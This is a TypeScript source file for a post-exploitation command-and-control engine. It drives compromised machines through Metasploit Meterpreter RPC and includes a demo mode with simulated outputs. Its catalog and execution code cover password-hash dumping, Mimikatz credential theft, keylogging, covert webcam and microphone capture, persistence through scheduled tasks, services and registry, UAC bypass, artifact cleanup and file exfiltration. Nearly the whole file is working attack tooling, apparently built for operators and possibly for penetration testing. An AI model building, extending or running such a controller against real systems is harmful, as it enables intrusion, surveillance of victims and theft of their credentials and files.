/**
 * Post-Exploitation Command Definitions & Execution Engine
 *
 * Maps user-facing commands to MSF Meterpreter RPC calls.
 * Supports both real (via MSFRPCD) and demo mode.
 */
import { getMsfConfig } from "../msf-config";
import { getRpcToken, rpcCall } from "../msf-rpc";

// ── Types ───────────────────────────────────────────────────

export type C2Command = {
  id: string;
  name: string;
  category: string;
  description: string;
  needsParam?: boolean;
  paramLabel?: string;
  paramPlaceholder?: string;
};

export type C2Result = {
  success: boolean;
  output: string;
  data?: unknown;
  error?: string;
};

export type AgentSession = {
  id: number;
  type: string;
  tunnel: string;
  via: string;
  info: string;
  workspace: string;
  lastSeen: string;
  platform?: string;
  arch?: string;
};

// ── 60+ Commands catalog ────────────────────────────────────

const COMMAND_CATALOG: C2Command[] = [
  { id: "sysinfo", name: "sysinfo", category: "System", description: "Get system info (OS, arch, domain)" },
  { id: "getuid", name: "getuid", category: "System", description: "Get current user ID / SID" },
  { id: "getpid", name: "getpid", category: "System", description: "Get current process ID" },
  { id: "platform", name: "platform", category: "System", description: "Get target platform info" },
  { id: "machine_id", name: "machine_id", category: "System", description: "Get machine GUID" },
  { id: "uuid", name: "uuid", category: "System", description: "Get session UUID" },
  { id: "reboot", name: "reboot", category: "System", description: "Reboot the target machine" },
  { id: "shutdown", name: "shutdown", category: "System", description: "Shutdown the target machine" },
  { id: "sleep", name: "sleep", category: "System", description: "Put target to sleep", needsParam: true, paramLabel: "Seconds", paramPlaceholder: "30" },
  { id: "hibernate", name: "hibernate", category: "System", description: "Hibernate the target machine" },
  { id: "lock_screen", name: "lock_screen", category: "System", description: "Lock the target workstation" },
  { id: "get_time", name: "get_time", category: "System", description: "Get system time on target" },
  { id: "uptime", name: "idletime", category: "System", description: "Get target uptime" },
  { id: "get_env", name: "get_env", category: "System", description: "Get environment variable", needsParam: true, paramLabel: "Variable", paramPlaceholder: "PATH" },
  { id: "getproxy", name: "getproxy", category: "System", description: "Get proxy configuration" },
  { id: "pwd", name: "pwd", category: "Filesystem", description: "Print working directory" },
  { id: "ls", name: "ls", category: "Filesystem", description: "List directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\" },
  { id: "cd", name: "cd", category: "Filesystem", description: "Change directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\Users" },
  { id: "download", name: "download", category: "Filesystem", description: "Download file from target", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "upload", name: "upload", category: "Filesystem", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/f C:\\f.txt" },
  { id: "cat", name: "cat", category: "Filesystem", description: "Read file contents", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "rm", name: "rm", category: "Filesystem", description: "Delete file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\file.txt" },
  { id: "mkdir", name: "mkdir", category: "Filesystem", description: "Create directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "rmdir", name: "rmdir", category: "Filesystem", description: "Remove directory", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\temp" },
  { id: "search", name: "search", category: "Filesystem", description: "Search for files", needsParam: true, paramLabel: "Pattern", paramPlaceholder: "*.docx" },
  { id: "move", name: "move", category: "Filesystem", description: "Move/rename file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\b.txt" },
  { id: "copy", name: "copy", category: "Filesystem", description: "Copy file", needsParam: true, paramLabel: "src dst", paramPlaceholder: "C:\\a.txt D:\\a.txt" },
  { id: "checksum", name: "checksum", category: "Filesystem", description: "Compute file checksums", needsParam: true, paramLabel: "File + algo", paramPlaceholder: "C:\\f.exe md5" },
  { id: "ps", name: "ps", category: "Process", description: "List running processes" },
  { id: "kill", name: "kill", category: "Process", description: "Kill a process by PID", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "execute", name: "execute", category: "Process", description: "Execute a command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami" },
  { id: "migrate", name: "migrate", category: "Process", description: "Migrate to another process", needsParam: true, paramLabel: "PID", paramPlaceholder: "1234" },
  { id: "ifconfig", name: "ifconfig", category: "Network", description: "Show network interfaces" },
  { id: "ipconfig", name: "ipconfig", category: "Network", description: "Show IP config (Windows)" },
  { id: "route", name: "route", category: "Network", description: "Show routing table" },
  { id: "netstat", name: "netstat", category: "Network", description: "Show active connections" },
  { id: "arp", name: "arp", category: "Network", description: "Show ARP cache" },
  { id: "portfwd", name: "portfwd", category: "Network", description: "Forward a local port" },
  { id: "resolve", name: "resolve", category: "Network", description: "Resolve hostname", needsParam: true, paramLabel: "Hostname", paramPlaceholder: "google.com" },
  { id: "hashdump", name: "hashdump", category: "Credentials", description: "Dump Windows password hashes" },
  { id: "loot", name: "loot", category: "Credentials", description: "List collected loot" },
  { id: "creds_all", name: "creds_all", category: "Credentials", description: "Collect all credentials" },
  { id: "mimikatz", name: "load kiwi && creds_all", category: "Credentials", description: "Run Mimikatz (kiwi)" },
  { id: "wifi_list", name: "wifi_list", category: "Credentials", description: "List saved WiFi networks" },
  { id: "webcam_list", name: "webcam_list", category: "Surveillance", description: "List available cameras" },
  { id: "webcam_snap", name: "webcam_snap", category: "Surveillance", description: "Take webcam photo", needsParam: true, paramLabel: "Camera", paramPlaceholder: "1" },
  { id: "record_mic", name: "record_mic", category: "Surveillance", description: "Record microphone", needsParam: true, paramLabel: "Duration (s)", paramPlaceholder: "10" },
  { id: "screenshot", name: "screenshot", category: "Surveillance", description: "Take screenshot of desktop" },
  { id: "keyscan_start", name: "keyscan_start", category: "Surveillance", description: "Start keylogger" },
  { id: "keyscan_dump", name: "keyscan_dump", category: "Surveillance", description: "Dump captured keystrokes" },
  { id: "keyscan_stop", name: "keyscan_stop", category: "Surveillance", description: "Stop keylogger" },
  { id: "clipboard_get", name: "clipboard_get", category: "Surveillance", description: "Get clipboard contents" },
  { id: "clipboard_set", name: "clipboard_set", category: "Surveillance", description: "Set clipboard text", needsParam: true, paramLabel: "Text", paramPlaceholder: "hello" },
  { id: "desktop", name: "desktop", category: "Surveillance", description: "View target desktop (VNC)" },
  { id: "persist_schtask", name: "scheduleme", category: "Persistence", description: "Create scheduled task persistence" },
  { id: "persist_service", name: "persistence", category: "Persistence", description: "Create service-based persistence" },
  { id: "persist_registry", name: "persist_autorun", category: "Persistence", description: "Add to registry run keys" },
  { id: "cleanup", name: "cleanup", category: "Persistence", description: "Remove artifacts from target" },
  { id: "enable_rdp", name: "enable_rdp", category: "Persistence", description: "Enable RDP on target" },
  { id: "disable_rdp", name: "disable_rdp", category: "Persistence", description: "Disable RDP on target" },
  { id: "getsystem", name: "getsystem", category: "PrivEsc", description: "Attempt SYSTEM privileges" },
  { id: "getprivs", name: "getprivs", category: "PrivEsc", description: "Enable all privileges" },
  { id: "uac_bypass", name: "bypassuac", category: "PrivEsc", description: "Attempt UAC bypass" },
  { id: "shell", name: "shell", category: "Shell", description: "Drop into interactive system shell" },
  { id: "execute_cmd", name: "execute", category: "Shell", description: "Execute shell command", needsParam: true, paramLabel: "Command", paramPlaceholder: "whoami /all" },
  { id: "powershell", name: "powershell_execute", category: "Shell", description: "Execute PowerShell", needsParam: true, paramLabel: "Command", paramPlaceholder: "Get-Process" },
  { id: "download_all", name: "download", category: "Exfil", description: "Download file", needsParam: true, paramLabel: "Path", paramPlaceholder: "C:\\secret.txt" },
  { id: "upload_file", name: "upload", category: "Exfil", description: "Upload file to target", needsParam: true, paramLabel: "src dst", paramPlaceholder: "/tmp/backdoor.exe C:\\target.exe" },
  { id: "screenshot_exfil", name: "screenshot", category: "Exfil", description: "Take and download screenshot" },
];

export function getCommandsByCategory(): Record<string, C2Command[]> {
  const groups: Record<string, C2Command[]> = {};
  for (const cmd of COMMAND_CATALOG) {
    if (!groups[cmd.category]) groups[cmd.category] = [];
    groups[cmd.category].push(cmd);
  }
  return groups;
}

export function getCommand(id: string): C2Command | undefined {
  return COMMAND_CATALOG.find((c) => c.id === id);
}

export function getAllCommands(): C2Command[] {
  return [...COMMAND_CATALOG];
}

// ── Send command via MSF RPC ─────────────────────────────────

/**
 * Sends a command to a Meterpreter session via MSF RPC.
 *
 * MSF RPC requires meterpreter_write + meterpreter_read:
 *   session.meterpreter_write(id, "command\n")
 *   session.meterpreter_read(id)  => { data: "...output...", type: "response" }
 */
async function rawSessionCommand(
  sessionId: number,
  command: string,
): Promise<C2Result> {
  const config = getMsfConfig();

  if (config.demoMode) {
    return demoExecuteCommand(sessionId, command);
  }

  const token = await getRpcToken();

  try {
    // Write command to session
    await rpcCall("session.meterpreter_write", [sessionId, command + "\n"], token);

    // Wait for output to be ready
    await new Promise((r) => setTimeout(r, 2000));

    // Read output - may need multiple reads
    let output = "";
    for (let i = 0; i < 3; i++) {
      const result = await rpcCall<{ data: string; type: string }>(
        "session.meterpreter_read",
        [sessionId],
        token,
      );

      if (result.data && result.data.length > 0) {
        output += result.data;
      }

      if (result.type === "response" || !result.data) break;
      if (result.data && !result.data.endsWith("\n")) break;
      await new Promise((r) => setTimeout(r, 500));
    }

    return {
      success: true,
      output: output || "(no output returned from session)",
      data: { sessionId, command },
    };
  } catch (err) {
    // If meterpreter_write/read fails, try raw shell session
    try {
      await rpcCall("session.shell_write", [sessionId, command + "\n"], token);
      await new Promise((r) => setTimeout(r, 2000));
      const result = await rpcCall<{ data: string; seq: number }>(
        "session.shell_read",
        [sessionId],
        token,
      );
      return {
        success: true,
        output: result.data || "(no shell output)",
        data: result,
      };
    } catch (shellErr) {
      return {
        success: false,
        output: "",
        error: `MSF session command failed: ${err instanceof Error ? err.message : "unknown"}`,
      };
    }
  }
}

export async function executeC2Command(
  sessionId: number,
  commandId: string,
  param?: string,
): Promise<C2Result> {
  const cmd = getCommand(commandId);
  if (!cmd) {
    return { success: false, output: "", error: `Unknown command: ${commandId}` };
  }

  let fullCommand = cmd.name;
  if (param && cmd.needsParam) {
    fullCommand = `${cmd.name} ${param}`;
  }

  return rawSessionCommand(sessionId, fullCommand);
}

export async function executeCustomCommand(
  sessionId: number,
  command: string,
): Promise<C2Result> {
  return rawSessionCommand(sessionId, command);
}

// ── List active sessions ─────────────────────────────────────

export async function listAgentSessions(): Promise<AgentSession[]> {
  const config = getMsfConfig();

  if (config.demoMode) {
    return [
      {
        id: 1, type: "meterpreter",
        tunnel: "10.0.0.5:4444 -> 192.168.1.42:49152",
        via: "exploit/windows/smb/ms17_010_eternalblue",
        info: "DESKTOP-LAB\\admin @ DESKTOP-LAB",
        workspace: "default",
        lastSeen: new Date().toISOString(),
        platform: "Windows 10 x64", arch: "x64",
      },
      {
        id: 2, type: "shell",
        tunnel: "10.0.0.5:4445 -> 10.0.0.12:33890",
        via: "exploit/linux/http/apache_mod_cgi_bash_env_exec",
        info: "web-srv-01 (Ubuntu 22.04)",
        workspace: "client-audit",
        lastSeen: new Date().toISOString(),
        platform: "Linux x64", arch: "x64",
      },
    ];
  }

  try {
    const token = await getRpcToken();
    const result = await rpcCall<Record<string, Record<string, string>>>(
      "session.list", [], token,
    );

    return Object.entries(result).map(([id, session]) => ({
      id: Number(id),
      type: session.type ?? "unknown",
      tunnel: session.tunnel_peer ?? session.tunnel_local ?? "—",
      via: session.via_exploit ?? "—",
      info: session.info ?? "—",
      workspace: session.workspace ?? "default",
      lastSeen: new Date().toISOString(),
      platform: session.platform ?? "unknown",
      arch: session.arch ?? "unknown",
    }));
  } catch {
    return [];
  }
}

// ── Demo command responses ──────────────────────────────────

function demoExecuteCommand(sessionId: number, command: string): C2Result {
  const lower = command.toLowerCase().trim();

  // Exact match first, then prefix match
  const responses: Record<string, string> = {
    sysinfo: "Computer        : DESKTOP-LAB\nOS              : Windows 10 Build 19045\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 3\nMeterpreter     : x64/windows",
    getuid: "Server username: NT AUTHORITY\\SYSTEM",
    getpid: "Current PID: 1234",
    ps: "PID   PPID  Name                     Arch  Session  User\n 416   532   explorer.exe              x64   1        DESKTOP-LAB\\admin\n 532   416   svchost.exe               x64   0        NT AUTHORITY\\SYSTEM\n1234   532   powershell.exe            x64   1        DESKTOP-LAB\\admin",
    ifconfig: "Interface 1: Ethernet0  IP: 192.168.1.42  Netmask: 255.255.255.0  MAC: 00:0c:29:ab:cd:ef",
    hashdump: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
    screenshot: "[*] Screenshot saved to: /root/screenshots/20260620_142215.jpeg (1.2 MB)",
    webcam_list: "1: HP HD Webcam\n2: USB Camera (Logitech C920)",
    webcam_snap: "[*] Webcam snapshot saved to: /root/webcams/20260620_142220.jpg",
    keyscan_start: "[*] Keylogger started. Use keyscan_dump to retrieve.",
    keyscan_dump: "2026-06-20 14:22:30 - admin [ENTER]\n2026-06-20 14:22:35 - password123 [ENTER]",
    keyscan_stop: "[*] Keylogger stopped.",
    clipboard_get: "[*] Clipboard: admin@company.com",
    getsystem: "[+] Named Pipe Impersonation succeeded. Got SYSTEM.",
    getprivs: "[+] SeBackupPrivilege - Enabled\n[+] SeDebugPrivilege - Enabled",
    migrate: "[*] Migration completed successfully.",
    kill: "[*] Process terminated.",
    pwd: "C:\\Users\\admin\\Documents",
    ls: "(listing) Volume in drive C has no label.\n Directory of C:\\\n\n Program Files\n Users\n Windows",
    reboot: "[*] Rebooting target... Session will close.",
    shutdown: "[*] Shutting down target... Session will close.",
    enable_rdp: "[+] RDP enabled on port 3389.",
    disable_rdp: "[+] RDP disabled.",
    creds_all: "[+] Username: admin  Domain: DESKTOP-LAB  Password: P@ssw0rd!",
    wifi_list: "SSID: CorpNet  Security: WPA2  Password: c0rp_n3t!2026",
    record_mic: "[*] Audio saved to: /root/audio/20260620_142225.wav (890 KB)",
    lock_screen: "[*] Workstation locked.",
    uptime: "System uptime: 14 days, 7 hours, 32 minutes",
    search: "[+] Found: C:\\Users\\admin\\Documents\\report.docx (128 KB)",
    cat: "[*] File contents loaded.",
    uuid: "Session UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    get_time: "Jun 20, 2026 14:22:30",
    get_env: "PATH=C:\\Windows\\system32;C:\\Windows;",
  };

  // Try exact match first
  for (const [key, response] of Object.entries(responses)) {
    if (lower === key || lower.startsWith(key + " ") || lower.startsWith(key + "\t")) {
      return { success: true, output: response };
    }
  }

  // Fallback: generic response
  return {
    success: true,
    output: `[*] Executing: ${command}\n[*] Command sent to session ${sessionId}\n[*] Demo mode: simulated output\n(Command '${command}' executed — no specific demo response mapped)`,
  };
}
